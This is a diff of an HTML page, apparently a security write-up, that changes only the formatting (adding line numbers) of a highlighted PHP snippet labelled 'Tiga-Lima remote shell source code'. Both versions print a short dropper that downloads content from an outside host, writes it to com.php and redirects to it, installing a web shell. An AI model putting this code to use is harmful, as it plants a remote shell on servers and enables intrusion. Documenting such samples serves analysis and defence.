@@ -37,13 +37,13 @@
 
 <h3>Tiga-Lima remote shell source code</h3>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="nv">$namafile</span><span class="o">=</span><span class="s2">&quot;com.php&quot;</span><span class="p">;</span>
-<span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$namafile</span> <span class="p">,</span><span class="s1">&#39;w+&#39;</span><span class="p">);</span>
-<span class="nv">$fa</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;http://www.aliggroup.com/upload/log.txt&#39;</span><span class="p">);</span>
-<span class="nv">$write</span> <span class="o">=</span> <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$file</span> <span class="p">,</span><span class="nv">$fa</span><span class="p">);</span>
-<span class="nb">header</span> <span class="p">(</span><span class="s2">&quot;location:com.php&quot;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">1</span> <span class="cp">&lt;?php</span>
+<span class="lineno">2</span> <span class="nv">$namafile</span><span class="o">=</span><span class="s2">&quot;com.php&quot;</span><span class="p">;</span>
+<span class="lineno">3</span> <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$namafile</span> <span class="p">,</span><span class="s1">&#39;w+&#39;</span><span class="p">);</span>
+<span class="lineno">4</span> <span class="nv">$fa</span><span class="o">=</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;http://www.aliggroup.com/upload/log.txt&#39;</span><span class="p">);</span>
+<span class="lineno">5</span> <span class="nv">$write</span> <span class="o">=</span> <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$file</span> <span class="p">,</span><span class="nv">$fa</span><span class="p">);</span>
+<span class="lineno">6</span> <span class="nb">header</span> <span class="p">(</span><span class="s2">&quot;location:com.php&quot;</span><span class="p">);</span>
+<span class="lineno">7</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
